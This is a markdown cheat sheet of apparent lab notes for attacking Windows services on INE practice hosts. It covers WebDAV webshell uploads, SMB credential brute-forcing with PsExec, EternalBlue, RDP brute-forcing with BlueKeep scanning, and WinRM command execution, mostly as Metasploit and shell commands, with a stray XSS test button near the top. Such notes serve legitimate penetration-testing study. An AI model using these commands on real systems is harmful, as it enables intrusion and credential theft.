 <h1>Windows IIS Server WebDAV</h1>
<button onclick="alert(1)">Click Me</button>

<i>Port Number : 80/443 </i>>

Davtest is a WebDAV vulnerability scanner that automates testing of file upload functionality. 

- **Purpose:** The tool probes a WebDAV-enabled server to determine what types of files can be uploaded and executed. It automatically tries to upload test files of various extensions (e.g., `.txt`, `.php`, `.aspx`) to see if the server is vulnerable to remote code execution.

Cadaver

Cadaver is a command-line WebDAV client, similar to a command-line FTP client. It allows for direct, interactive management of files on a WebDAV server. 

- **Purpose:** After Davtest identifies a server that allows file uploads, Cadaver is used by the tester to manually upload a malicious file, like a reverse shell, to the server.

use ==**RUSTSCAN**== for faster scan of ports of host machine

```
~ nmap --script=http-enum -p 80 -sV demo.ine.local
~ davtest -url http://demo.ine.local/webdav
~ davtest -auth bob:password -url http://demo.ine.local/webdav
~ cadaver http://demo.ine.local/webdav
~ put /usr/share/webshells/asp/webshell.asp
~ ls
```
then visit demo.ine.local/webdav/webshell.asp

<h1>Windows IIS Server WebDAV - Metasploit </h1>

~# serive postgresql start
~# msfconsole
```
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/meow%RAND%.asp
exploit
```
.. this will generate meterpreter
shell
cd /
dir
type flag.txt

<h1> SMB server PSexec </h1>

the PSExec communicates to the host system through SMB

~# serive postgresql start
~# msfconsole

1st we need SMB credentials:
```
msfconsole 
use auxiliary/scanner/smb/smb_login
set USER_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
run
```

this will brute-force and find  credentials hopefully.
Now we use it to exploit.
2nd:
```
 msfconsole 
 use exploit/windows/smb/psexec
 set RHOSTS demo.ine.local
 set SMBuser ----
 set SMBpass ----
 run
```

<h1>SMB Vulnerability EthernalBlue (MS17-010) </h1>
[CVE2017-0144](https://github.com/3ndG4me/AutoBlue-MS17-010) 
<i> Port Number : 445 </i>
<i> Ransomware Attack : WannaCry </i>  

Affected machines:

 Windows Vista
 Windows 7
 Windows 8.1
 Windows 10
 Windows Server 2008
 Windows Server 2012
 Windows Server 2016

without metasploit :
```
 nmap -sC -sV -Pn demo.ine.local
 or --script=smb-vuln-ms17-010
 install the exploit files from above link.
 use the ./shell_prep.sh to get shellcode example_name.bin
 ~# python eternalblue.py 10.10.10.3  sellcode/example_nam.bin
 ~# nc -nlvp 1234
```

```
~# serive postgresql start
~# msfconsole
```
with metasploit the method is given below:
```
 use exploit/windows/smb/ms17_010_eternalblue
```

<h1> Exploiting RDP </h1>
<i>Port Number : 3389 </i>
```
 ~#hydra -L usrname.txt -P passwrd.txt rdp://demo.ine.local -s 3389(portnumber)

 ~#use auxiliary/scanner/rdp/rdp_scanner

 ~#xfreerdp /u:adminuser /p:passwd /v:demo.ine.local:3389
```

<h1> RDP Vulnerability CVE-2019-0708 </h1>
<i>Port Number: 3389 </i>
<i>BlueKeep </i>

Affected versions of Windows:
 XP
 Vista
 7
 server 2008 & R2

~# serive postgresql start
~# msfconsole

```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```
#this will work on only 64 bit version

<h1>WinRM (Windows Remote Management) </h1>
<i>Port Number: 5985/5986(https)</i>
Used on a local network connect.

	'Crackmapexec' to perform a brute-force on WinRM
	'evil-winrm' to obtain a command shell session\
	
```
	crackmapexec winrm domain.ine.local -u __ -p __ 
	crackmapexec winrm domain.ine.local -u __ -p __ -x "whoami" # this will execute the whoami in the domai.ine.local 
```

```
evil-winrm.rb -u __ -p __  -i 10.10.0.0 # get access to the target system
```

```
service postresql start && msfconsole
	search winrm_login
	use auxiliary/scanner/winrm/winrm_login
		  set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		   set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		   set VERBOSE false
		   set PASSWORD anything
		   exploit
```
		   
```
	search winrm_script 
	use exploit/windows/winrm/winrm_script_exec
		set RHOSTS demo.ine.local
		set USERNAME administrator
		set PASSWORD tinkerbell
		set CMD whoami
		exploit
```

